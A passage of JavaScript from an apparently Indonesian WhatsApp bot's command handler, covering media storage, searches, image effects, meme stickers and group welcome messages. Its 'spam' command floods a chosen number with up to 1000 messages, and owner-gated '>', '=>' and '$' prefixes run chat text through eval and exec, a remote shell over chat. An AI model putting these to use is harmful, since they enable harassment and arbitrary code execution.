} else reply(`Kirim Video Dengan caption ${prefix + command}`)
break
case 'getvideo': case 'getmp4':
if (!q) return reply(`Masukkan Query Nama Video, List? Gunakan command #listvideo`)
if (cekMedia("video", q) !== q) return reply("Nama video tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listvideo")
sendMedia("video",`./media/${q}.mp4`)
break
case 'listvideo': case 'getmp4': 
if (VideoMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add video terlebih dahulu, Gunakan command #addvideo")
satzz.sendMessage(from, {text: `[ *LIST-VIDEO* ]\n• *Total* : ${VideoMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("video")}]
})
break
case 'deletevideo': case 'dellvideo': case 'deletemp4': case 'dellmp4':
if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan nama video yang ingin dihapus")
if (cekMedia("video", q) !== q) return reply("Nama video tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listvideo")
deleteMedia("video", q)
only("sukses", satzz, from)
break

case 'adds': case 'addstiker': case 'addsticker':
if (isMedia || isQuotedSticker) { 
if (!q) return reply(`Masukkan Query Nama sticker, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama sticker cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("sticker", q) == q) return reply("Nama sticker tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("sticker", q)
addMedia("sticker", q)
reply(`[ *STICKER-SAVE* ]\nSukses, sticker("${q}.webp") Berhasil terSave di database bot ini, Silahkan cek sticker kamu di #liststicker`)
} else reply(`Kirim sticker Dengan caption ${prefix + command}`)
break
case 'gets': case 'getstiker': case 'getsticker':
if (!q) return reply(`Masukkan Query Nama sticker, List? Gunakan command #liststicker`)
if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terdaftar di database bot, Silahkan cek kembali di #liststicker")
sendMedia("sticker",`./media/${q}.webp`)
break
case 'lists': case 'liststiker': case 'liststicker':
if (StickerMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add sticker terlebih dahulu, Gunakan command #addsticker")
satzz.sendMessage(from, {text: `[ *LIST-STICKER* ]\n• *Total* : ${StickerMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("sticker")}]
})
break
case 'deletes': case 'dells': case 'deletestiker': case 'dellstiker': case 'deletesticker': case 'dellsticker': 

if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan nama sticker yang ingin dihapus")
if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terdaftar di database bot, Silahkan cek kembali di #liststicker")
deleteMedia("sticker", q)
only("sukses", satzz, from)
break


case 'addaudio': case 'addmp3': case 'addvn':

if (isMedia || isQuotedAudio) { 
if (!q) return reply(`Masukkan Query Nama audio, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama audio cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("audio", q) == q) return reply("Nama audio tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("audio", q)
addMedia("audio", q)
reply(`[ *AUDIO-SAVE* ]\nSukses, audio("${q}.mp3") Berhasil terSave di database bot ini, Silahkan cek audio kamu di #listaudio`)
} else reply(`Kirim audio Dengan caption ${prefix + command}`)
break
case 'getaudio': case 'getmp3': case 'getvn':

if (!q) return reply(`Masukkan Query Nama audio, List? Gunakan command #listaudio`)
if (cekMedia("audio", q) !== q) return reply("Nama audio tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listaudio")
sendMedia("audio",`./media/${q}.mp3`)
break
case 'listaudio': case 'listmp3': case 'listvn': 

if (AudioMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add audio terlebih dahulu, Gunakan command #addaudio")
satzz.sendMessage(from, {text: `[ *LIST-AUDIO* ]\n• *Total* : ${AudioMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("audio")}]
})
break
case 'deleteaudio': case 'dellaudio': case 'deletevn': case 'dellvn': case 'deletemp3': case 'dellmp3': 

if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan nama audio yang ingin dihapus")
if (cekMedia("audio", q) !== q) return reply("Nama audio tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listaudio")
deleteMedia("audio", q)
only("sukses", satzz, from)
break

case 'happymod':

if (!q) return reply("Masukkan nama Apk")
var nyz = await api.search.happymod(q)
reply(await getResult("[ *HAPPYMOD* ]", ["Title","Url"],
[nyz.result[0].title, nyz.result[0].link]))
break
case 'carigrup': case 'carigrub':

if (!q) return reply("Masukkan nama Group")
var nyz = await api.search.carigrup(q) 
reply(await getResult("[ *SEARCH-GRUP* ]", ["Nama","Url"],
[nyz.result[0].nama, nyz.result[0].link]))
break
case 'kusonime':

if (!q) return reply("Masukkan nama anime")
var nyz = await api.search.kusonime(q) 
reply(await getResult("[ *KOSUNIME* ]", 
["Judul","Desk","Genre","Status","Produser","Rate","Type","Link","Total_Eps","Durasi","Tgl_Rilis"],
[nyz.result.judul, nyz.result.desk, nyz.result.genre, nyz.result.status, nyz.result.produser, nyz.result.rate, nyz.result.type, nyz.result.link, nyz.result.total_eps, nyz.result.durasi, nyz.result.tgl_rilis]))
break
case 'cuaca':

if (!q) return reply("Masukkan nama kota")
var nyz = await api.search.cuaca(q) 
reply(await getResult("[ *CUACA* ]",
["Nama","Longitude","Latitude","Suhu","Angin","Kelembaban","Cuaca","Keterangan","Udara"],
[nyz.data.Nama, nyz.data.Longitude, nyz.data.Latitude, nyz.data.Suhu, nyz.data.Angin, nyz.data.Kelembaban, nyz.data.Cuaca, nyz.data.Keterangan, nyz.data.Udara]))
break
case 'artinama':

if (!q) return reply("Masukkan nama")
var nyz = await api.search.artinama(q) 
reply(await getResult("[ *ARTINAMA* ]",
["Result"],
[nyz.result.split("(adsbygoogle = window.adsbygoogle || []).push({})")[1]]))
break
case 'igstalk':

if (!q) return reply("Masukkan nama user instagram")
var nyz = await api.search.igstalk(q) 
console.log(nyz)
reply(await getResult("[ *STALKIG* ]",
["url","fullname","private","verified","bio","follower","following","conneted_fb","videotimeline","timeline","savedmedia","collections"],
[nyz.data.url, nyz.data.fullname, nyz.data.private, nyz.data.verified, nyz.data.bio, nyz.data.follower, nyz.data.following, nyz.data.conneted_fb, nyz.data.videotimeline, nyz.data.timeline, nyz.data.savedmedia, nyz.data.collections ]))
break
case 'wallpaper':

if (!q) return reply("Masukkan query")
only("proses", satzz, from)
var nyz = await api.search.wallpapercave(q) 
sendMedia("image", nyz.result[0], "😀")
break
case 'pinterest':

if (!q) return reply("Masukkan kata")
var nyz = await api.search.pin(q) 
sendMedia("image", nyz[Math.floor(Math.random() * nyz.length)], "😀")
break

case 'imagesketch': case 'shit': case 'burn': case 'blur': case 'greyscale': case 'pixelate': case 'removebg': case 'beautiful': case 'trash': case 'jail': case 'wanted': case 'rip': case 'gay': case 'invert':

if (isMedia || isQuotedImage) { 
only("proses", satzz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command}?url=${await download("imageUrl","makers")}`, "😀")
} else { reply("Tag/Kirim Image dengan caption " + prefix + command)}
break

case 'imagesketchme': case 'shitme': case 'burnme': case 'blurme': case 'greyscaleme': case 'pixelateme': case 'removebgme': case 'beautifulme': case 'trashme': case 'jailme': case 'wantedme': case 'ripme': case 'gayme': case 'invertme':

only("proses", satzz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command.split("me")[0]}?url=${await download("PPUrl", sender)}`, "😀")
break
case 'imagesketchtag': case 'shittag': case 'burntag': case 'blurtag': case 'greyscaletag': case 'pixelatetag': case 'removebgtag': case 'beautifultag': case 'trashtag': case 'jailtag': case 'wantedtag': case 'riptag': case 'gaytag': case 'inverttag':

if (Tag() == "") return reply("tag Orang yang mau anda Jadikan objek")
only("proses", satzz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command.split("tag")[0]}?url=${await download("PPUrl", Tag()[0])}`, "😀")
break


case 'ttpwhite': case 'ttpyellow': case 'ttpblue': case 'ttpred': case 'ttpgreen': case 'ttpblack': case 'ttpbrown':
case 'ttpteal': case 'ttpsilver': case 'ttppurple': case 'ttpgray': case 'ttporange': case 'ttpmaroon': case 'ttpaquamarine': case 'ttpcoral': case 'ttpfuchsia': case 'ttpwheat':
case 'ttplime': case 'ttpcrimson': case 'ttpkhaki': case 'ttpmagenta': case 'ttpplum': case 'ttpolive': case 'ttpcyan':

var nyz = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=${body.slice(4).trim().split(/ +/).shift().toLowerCase()}`
var nyz1 = await imageToBase64(JSON.stringify(nyz).replace(/\"/gi, ''))
fs.writeFileSync('getpp.jpeg', nyz1, 'base64')
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", satzz, from) })
.on('end', function () {satzz.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
break

case 'meme1': case 'smeme1': case 'memegen1':
case 'meme2': case 'smeme2': case 'memegen2':
case 'meme3': case 'smeme3': case 'memegen3':

if (isMedia || isQuotedImage) { 
if (command == 'meme1' || command == 'smeme1' || command == 'memegen1') {
if (!q) return reply("Masukkan Text")
var nyz = `https://pecundang.herokuapp.com/api/memegen1?teks=${q}&img_url=${await download("imageUrl","makers")}`
}
if (command == 'meme2' || command == 'smeme2' || command == 'memegen2') {
if (!q1 && !q2) return reply("Masukkan Text1&text2")
var nyz = `https://pecundang.herokuapp.com/api/memegen2?teks1=${q1}&teks2=${q2}&img_url=${await download("imageUrl","makers")}`
}
if (command == 'meme3' || command == 'smeme3' || command == 'memegen3') {
if (!q) return reply("Masukkan Text")
var nyz = `https://pecundang.herokuapp.com/api/memegen3?teks=${q}&img_url=${await download("imageUrl","makers")}`
}
var nyz1 = await imageToBase64(JSON.stringify(nyz).replace(/\"/gi, ''))
fs.writeFileSync('getpp.jpeg', nyz1, 'base64')
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", satzz, from) })
.on('end', function () {satzz.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
} else reply(`Kirim image Dengan caption ${prefix + command}`)
break
case 'spam':
if (!q) return reply("Contoh Pengunaan : \n\n spam 6281316701742|sayang|10")
let tn = q.split("|")[0]
let txtz = q.split("|")[1]
let count = q.split("|")[2]
let tod = tn.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
if (tn.startsWith("08")) return reply("nomor harus dimulai dengan kode negara, cth : 6281316701742")
var cekon = await satzz.onWhatsApp(tod)
if (cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
if (isNaN(count)) return reply(`Harus nomor, kocak`)
if (Number(count) >= 1001) return reply('Kebanyakan, Max 1000')
for (let i = 0; i < count; i++){
satzz.sendMessage(tod, { text: txtz}, { quoted: finv})
	}
	break
case 'invite':
satzz.sendGroupV4Invite("120363022284397832@g.us", sender, "https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq", '99999', 'KONTOL', 'JOIN SINI BOSS', thumb)
break
                
default: 
if (budy.startsWith('=>')) {
if (!isOwner) return reply('SokAsik')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!isOwner) return reply('SokAsik')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!isOwner) return reply('SokAsik')
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')) {
if (!isOwner) return reply('SokAsik')
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
// anti badword
let badwordRegex = /anj(k|g)|ajn?(g|k)|a?njin(g|k)|bajingan|b(a?n)?gsa?t|ko?nto?l|me?me?(k|q)|pe?pe?(k|q)|meki|titi(t|d)|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|(k|ng)e?nto?(t|d)|jembut|bego|dajj?al|janc(u|o)k|pantek|puki ?(mak)?|kimak|kampang|lonte|col(i|mek?)|pelacur|henceu?t|nigga|fuck|dick|bitch|tits|bastard|asshole/i // tambahin sendiri
let isBadword = badwordRegex.exec(text)
if (isBotGroupAdmins && isBadword && isGroup) {
const hapus = sat.key.participant
const bang = sat.key.id
await satzz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
}

// antilink
if (isGroup && dataOnly("antilink", "cek", from) == from){
if (budy.includes("chat.whatsapp.com/") && isBotGroupAdmins) { 
let hapus = sat.key.participant
let bang = sat.key.id
satzz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }}) } 
}

	if (isPrivate && isMenfess && isTo) {
         	for (let bi of menfess) {
         	var mun = [];
			mun.push(bi.dari)
			copyNForward(bi.dari, sat, true)
		   } 
		}
          if (isPrivate && isMenfess && isSend) {
          	var mun = [];
			for (let gU of menfess) {
			mun.push(gU.kepada)
			copyNForward(gU.kepada, sat, true)
			}
			}

if (budy == "Assalamualaikum" || budy == "assalamualaikum" && !isMenfess){
rpy(from, "Waalaikumsalam❤")
} // AUTORESPODER 
if (budy == "P" || budy == "p" || budy == "bot" || budy == "Bot" || budy == "BOT" && !isMenfess) {
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
"pollCreationMessage": {
"name": "*AYO RATING BOT INI!*",
"options": [
	{
"optionName": "BAGUS",
	},
	{
"optionName": "LUMAYAN BAGUS",
	},
	{
"optionName": "BAGUS BANGET",
	},
    {
"optionName": "JELEK",
	},
	{
"optionName": "JELEK BANGET",
	}
],
"selectableOptionsCount": 1
	}
}), { quoted: sat })
satzz.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
}
   
satzz.ws.on('CB:call', async (json) => {
    const callerId = json.content[0].attrs['call-creator']
    if (json.content[0].tag == 'offer') {
    var nnom = ["6281316701742"]
    let pa7rick = await satzz.sendContact(nnom, sat)
    satzz.sendMessage(callerId, { text: `Sistem otomatis block!\nJangan menelpon bot!\nSilahkan Hubungi Owner Untuk Dibuka !`}, { quoted : pa7rick })
    await sleep(8000)
    await satzz.updateBlockStatus(callerId, "block")
    }
    })
/// Welcome Auto 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄
 satzz.ev.on('group-participants.update', async (anu) => {
        console.log(anu)
        try {
            let metadata = await satzz.groupMetadata(anu.id)
            let participants = anu.participants
            for (let num of participants) {
//═══════[get profile pic]════════\\
                try {
                    ppuser = await satzz.profilePictureUrl(num, 'image')
                } catch {
                    ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }

//═══════[get group dp]════════\\
                try {
                    ppgroup = await satzz.profilePictureUrl(anu.id, 'image')
                } catch {
                    ppgroup = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                
let nama = await satzz.getName(num)
memb = metadata.participants.length

Kon = await getBuffer(`https://malesin.xyz/welcome2?username=${nama}groupname=${metadata.subject}&membercount=${memb}&profile=${ppuser}&background=https%3A%2F%2Ftelegra.ph%2Ffile%2F3983c55ac7f3ebea225d3.jpg`)

Tol = await getBuffer(`https://malesin.xyz/goodbye2?username=${nama}groupname=${metadata.subject}&membercount=${memb}&profile=${ppuser}&background=https%3A%2F%2Ftelegra.ph%2Ffile%2F3983c55ac7f3ebea225d3.jpg`)
                if (anu.action == 'add') {
                    satzz.sendMessage(anu.id, { image: Kon, contextInfo: { mentionedJid: [num] }, caption: `Welcome To ${metadata.subject} @${num.split("@")[0]}

Description: ${metadata.desc}

Welcome 👋`} )
                } else if (anu.action == 'remove') {
                    satzz.sendMessage(anu.id, { image: Tol, contextInfo: { mentionedJid: [num] }, caption: `@${num.split("@")[0]} Left ${metadata.subject}

Good Bye 👋` })
                }
            }
        } catch (err) {
            console.log(err)
        }
    })	
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
}} catch (e) {LogLoadingg(`${e}`)}}